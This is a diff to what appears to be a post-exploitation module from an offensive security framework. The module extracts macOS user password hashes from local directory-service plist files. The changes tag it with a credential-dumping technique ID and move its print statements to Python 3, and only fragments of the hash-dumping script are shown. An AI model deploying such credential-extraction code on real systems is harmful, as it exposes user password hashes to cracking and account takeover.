@@ -1,5 +1,5 @@
 from builtins import object
-from lib.common import helpers
+
 
 class Module(object):
 
@@ -15,6 +15,10 @@ class Module(object):
 
             # more verbose multi-line description of the module
             'Description': ("Extracts found user hashes out of /var/db/dslocal/nodes/Default/users/*.plist"),
+
+            'Software': '',
+
+            'Techniques': ['T1003'],
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -95,7 +99,7 @@ def getUserHash(userName):
             return (userName, "$ml$%s$%s$%s" %(iterations, saltHex, entropyHex))
 
     except Exception as e:
-        print "getUserHash() exception: %s" %(e)
+        print("getUserHash() exception: %s" %(e))
         pass
 
 
@@ -107,7 +111,9 @@ for userName in userNames:
     if(userHash):
         userHashes.append(getUserHash(userName))
 
-print userHashes
+print(userHashes)
 """
 
+
         return script
+
